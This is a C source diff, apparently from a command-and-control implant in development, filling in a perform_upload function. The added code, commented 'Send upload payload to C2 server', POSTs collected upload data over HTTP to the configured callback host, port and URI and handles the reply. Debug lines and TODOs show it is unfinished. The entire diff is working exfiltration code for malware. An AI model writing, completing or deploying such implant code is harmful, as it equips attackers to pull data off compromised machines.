@@ -333,9 +333,24 @@ void perform_upload(AgentState *state, UploadManager *upload) {
 	// Generate upload payload.
 	char *msg = generate_upload_message(upload);
 	
-	dprintf("DELETEME generated msg, ready to perform...");
+	// Send upload payload to C2 server.
+	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
+	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpResponse response = {0};
 	
-	// TODO
+	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
-	upload->finished = TRUE; // DELETEME just to avoid infinite loop while testing...
+	dprintf("DELETEME sent upload request message to the server...");
+	
+	if (response.status_code == 200) {
+		dprintf("DELETEME got an upload reply message from the server...");
+		// TODO parse the reply and use it to update the upload manager
+	}
+	
+	// Free unneeded allocations.
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+	
+	upload->finished = TRUE; // TODO delete this, just here to avoid infinite loop while testing...
 }
